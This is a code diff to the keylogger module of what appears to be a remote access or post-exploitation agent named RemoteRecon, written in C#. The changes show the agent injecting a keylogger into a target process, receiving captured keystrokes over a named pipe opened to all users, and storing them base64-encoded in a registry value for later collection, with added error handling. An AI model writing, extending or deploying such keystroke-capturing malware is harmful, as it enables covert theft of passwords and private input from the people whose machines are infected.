@@ -13,7 +13,8 @@ namespace RemoteReconCore
     public class Keylogger : IJobs
     {
         private int targetPid;
-
+        private static NamedPipeServerStream server;
+        private static Thread t;
         public Keylogger(int pid)
         {
             targetPid = pid;
@@ -30,17 +31,26 @@ namespace RemoteReconCore
 #if DEBUG 
                 Console.WriteLine("Injected Keylogger");
 #endif
-                Thread t = new Thread(() =>
+                try
                 {
-                    ReceiveKeyStrokes();
-                });
-                t.IsBackground = true;
-                t.Start();
+                    Agent.t = new Thread(() =>
+                    {
+                        ReceiveKeyStrokes();
+                    });
+                    Agent.t.IsBackground = true;
+                    Agent.t.Start();
 #if DEBUG
-                Console.WriteLine("Started background thread to sync keylogger");
+                    Console.WriteLine("Started background thread to sync keylogger");
 #endif
-                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Keylogger successfully started"));
-                return new KeyValuePair<int, string>(0, msg);
+                    string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Keylogger successfully started"));
+                    return new KeyValuePair<int, string>(0, msg);
+                }
+                catch (Exception)
+                {
+                    string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Keylog background thread failed to start"));
+                    return new KeyValuePair<int, string>(2, msg);
+                }
+                
             }
             
         }
@@ -48,31 +58,50 @@ namespace RemoteReconCore
         private static void ReceiveKeyStrokes()
         {
             string enc = "";
-            PipeSecurity ps = new PipeSecurity();
-            ps.SetAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null), PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow));
-            NamedPipeServerStream server = new NamedPipeServerStream("svc_kl", PipeDirection.InOut, 1, PipeTransmissionMode.Message);
-            server.SetAccessControl(ps);
-            server.WaitForConnection();
+            
+            try
+            {
+                PipeSecurity ps = new PipeSecurity();
+                ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow));
+                server = new NamedPipeServerStream("svc_kl", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.WriteThrough, 128, 128, ps, HandleInheritability.None, PipeAccessRights.ChangePermissions);
+#if DEBUG
+                Console.WriteLine("Waiting for client to connect");
+#endif
+                server.WaitForConnection();
+            }
+            catch (Exception e)
+            {
+#if DEBUG
+                Console.WriteLine(e.ToString());
+#endif
+                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
+                Agent.rrbase.SetValue(Agent.modkey, msg);
+            }
+            
+            
 #if DEBUG
             Console.WriteLine("Received connection from client");
             Console.WriteLine("Starting loop");
 #endif
-            StreamReader sr = new StreamReader(server);
+            //StreamReader sr = new StreamReader(server);
             while(server.IsConnected)
             {
-                string oldVal = " ";
+                string oldVal = "";
                 oldVal = Encoding.ASCII.GetString(Convert.FromBase64String((string)Agent.rrbase.GetValue(Agent.kkey)));
                 
                 try
                 {
-                    string ks = sr.ReadLine();
-                    ks = ks.TrimEnd(new char[] { '\0','\r','\n'});
-                    oldVal = oldVal + ks;
-                    enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(oldVal));
-#if DEBUG
-                    Console.Write(oldVal);
-#endif
                     
+                    byte[] pipeBytes = new byte[2];
+                    server.Read(pipeBytes, 0, 2);
+                    //server.Flush();
+                    string ks = Encoding.ASCII.GetString(pipeBytes);
+#if DEBUG
+                    Console.WriteLine("Reading Value");
+#endif
+                    ks = ks.TrimEnd(new char[] { '\0'});
+                    oldVal = oldVal + ks;
+                    enc = Convert.ToBase64String(Encoding.UTF8.GetBytes(oldVal));
                 }
                 catch (Exception e)
                 {
@@ -83,13 +112,14 @@ namespace RemoteReconCore
                 }
 
                 Agent.rrbase.SetValue(Agent.kkey, enc);
-                Thread.Sleep(Agent.sleep * 1000);
+                Thread.Sleep(1000);
             }
 
 #if DEBUG
             Console.WriteLine("Client disconnected");
 #endif
-            sr.Close();
+            //sr.Close();
+            server.Flush();
             server.Close();
             server.Dispose();
             
